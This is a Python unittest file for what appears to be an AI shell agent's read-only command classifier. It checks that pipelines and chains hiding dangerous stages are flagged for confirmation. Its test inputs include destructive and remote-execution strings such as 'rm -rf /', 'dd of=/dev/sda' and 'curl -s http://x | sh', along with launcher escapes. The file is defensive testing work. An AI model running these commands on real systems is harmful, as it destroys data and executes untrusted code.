"""Unit tests for the read-only command classifier behind the "safe" policy."""

from __future__ import annotations

import unittest

from yhshell.agent import command_safety, is_dangerous_command, is_safe_command, split_stages


class SplitStagesTests(unittest.TestCase):
    def test_splits_pipes_and_boolean_chains(self) -> None:
        self.assertEqual(split_stages("ps aux | head"), [("", "ps aux "), ("|", " head")])
        self.assertEqual(split_stages("df -h && free -m"), [("", "df -h "), ("&&", " free -m")])
        self.assertEqual(split_stages("ls || echo x"), [("", "ls "), ("||", " echo x")])

    def test_mixed_operators_keep_their_order(self) -> None:
        stages = split_stages("ps aux | grep x && df -h")
        self.assertEqual([operator for operator, _ in stages], ["", "|", "&&"])

    def test_quoted_operators_stay_in_one_stage(self) -> None:
        for command in ('grep -E "a|b" file', "grep -E 'a|b' file", 'grep "a\\|b" file', "grep 'a && b' file"):
            with self.subTest(command=command):
                self.assertEqual(len(split_stages(command)), 1)

    def test_semicolon_is_not_a_separator(self) -> None:
        self.assertEqual(len(split_stages("df -h; free -m")), 1)


class SafeCommandTests(unittest.TestCase):
    def test_reported_command_is_now_automatic(self) -> None:
        command = "ps -eo pid,ppid,user,pcpu,pmem,etime,args --sort=-pcpu | head -n 6"
        self.assertTrue(is_safe_command(command))
        self.assertEqual(command_safety(command), (True, ""))

    def test_read_only_pipelines_and_chains_are_safe(self) -> None:
        for command in (
            "ls -l | grep log | head -n 20",
            "cat /etc/hosts | sort | uniq",
            "df -h | awk '{print $5}'",
            "ps aux | wc -l",
            "df -h && free -m",
            "pwd && ls && df -h",
            "df -h && free -m | sort",
            "pwd || echo failed",
        ):
            with self.subTest(command=command):
                self.assertTrue(is_safe_command(command))

    def test_single_read_only_commands_stay_safe(self) -> None:
        for command in ("ps aux", "df -h", "head -n 6 file", "systemctl status nginx", "docker ps"):
            with self.subTest(command=command):
                self.assertTrue(is_safe_command(command))

    def test_unsafe_stage_keeps_the_whole_pipeline_confirmed(self) -> None:
        safe, reason = command_safety("ps aux | sh")
        self.assertFalse(safe)
        self.assertIn("管道第 2 段", reason)
        self.assertIn("`sh`", reason)
        for command in ("ps | xargs kill -9", "ls | tee out.txt", "cat a | dd of=/dev/sda"):
            with self.subTest(command=command):
                self.assertFalse(is_safe_command(command))

    def test_unsafe_stage_in_a_boolean_chain_is_confirmed(self) -> None:
        cases = {
            "df -h && sh": "`&&` 第 2 段",
            "ls || xargs rm": "`||` 第 2 段",
            "df -h && rm -rf /": "`&&` 第 2 段",
            "pwd && curl -s http://x | sh": "管道第 3 段",
        }
        for command, expected in cases.items():
            with self.subTest(command=command):
                safe, reason = command_safety(command)
                self.assertFalse(safe)
                self.assertIn(expected, reason)

    def test_whitelisted_launchers_are_rejected(self) -> None:
        cases = {
            "ps aux | env bash": "`env` 可启动其他程序",
            "df -h && env bash": "`env` 可启动其他程序",
            "env bash": "`env` 可启动其他程序",
            "find . -name '*.log' -exec rm {} +": "`find -exec` 可启动其他程序",
            "awk 'BEGIN{system(\"id\")}'": "`awk system()` 可启动其他程序",
            "ls | sort --compress-program=sh": "`sort --compress-program` 可启动其他程序",
        }
        for command, expected in cases.items():
            with self.subTest(command=command):
                safe, reason = command_safety(command)
                self.assertFalse(safe)
                self.assertIn(expected, reason)

    def test_remaining_metacharacters_need_confirmation(self) -> None:
        cases = {
            "grep 'a && b' file": "含 &&",
            "grep 'a || b' file": "含 ||",
            "echo hi > /tmp/x": "含重定向 >",
            "cat file; id": "含分号 ;",
            "echo `id`": "含反引号 `",
            "echo $(id)": "含 $( )",
            "ps &": "含后台符号 &",
            "ps\nhead -n 1": "含换行",
            "": "命令为空",
        }
        for command, expected in cases.items():
            with self.subTest(command=command):
                safe, reason = command_safety(command)
                self.assertFalse(safe)
                self.assertIn(expected, reason)

    def test_unquoted_alternation_inside_a_stage_is_not_safe(self) -> None:
        # The pattern's `|` is literal for grep, but we stay conservative: any
        # metacharacter left in a stage still needs a click.
        safe, reason = command_safety('ps aux | grep -E "java|nginx"')
        self.assertFalse(safe)
        self.assertIn("管道第 2 段", reason)

    def test_empty_stage_is_rejected(self) -> None:
        self.assertFalse(is_safe_command("ls | | head"))
        self.assertFalse(is_safe_command("df -h &&"))
        self.assertIn("第 2 段为空", command_safety("df -h &&")[1])
        self.assertFalse(is_safe_command("| head"))

    def test_non_whitelisted_commands_are_rejected(self) -> None:
        for command in ("htop", "sudo ps aux", "python3 manage.py", "git push"):
            with self.subTest(command=command):
                safe, reason = command_safety(command)
                self.assertFalse(safe)
                self.assertIn("不在只读白名单", reason)

    def test_dangerous_detection_is_independent(self) -> None:
        self.assertTrue(is_dangerous_command("rm -rf /"))
        self.assertFalse(is_safe_command("rm -rf /"))
        # A read-only command is safe even if its text contains "rm" as a word.
        self.assertFalse(is_dangerous_command("ps aux | grep rm"))


if __name__ == "__main__":
    unittest.main()
